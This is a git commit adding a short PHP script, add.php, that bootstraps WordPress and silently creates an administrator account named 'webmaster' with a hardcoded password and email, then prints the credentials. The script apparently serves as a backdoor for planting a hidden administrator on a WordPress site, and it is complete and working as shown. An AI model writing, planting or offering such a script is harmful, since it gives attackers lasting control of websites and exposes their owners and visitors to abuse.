e5ba3ad7f3f7e62e2234f5f6030e70f9e536e402
handoko1013 <94730449+handoko1013@users.noreply.github.com>
2025-12-04 18:48:38 +0700

    Add files via upload

---
+++ add.php
@@ -0,0 +1,26 @@
+<?php
+define('WP_USE_THEMES', false);
+require_once('./wp-load.php');
+
+$username = 'webmaster';
+$password = 'Seo301Take!';
+$email = 'jobnas@gamail.com';
+
+if (!username_exists($username) && !email_exists($email)) {
+    $user_id = wp_create_user($username, $password, $email);
+    
+    if (!is_wp_error($user_id)) {
+        // Set role sebagai administrator
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+        
+        echo "User admin berhasil dibuat!";
+        echo "Username: " . $username;
+        echo "Password: " . $password;
+    } else {
+        echo "Error: " . $user_id->get_error_message();
+    }
+} else {
+    echo "User sudah ada!";
+}
+?>
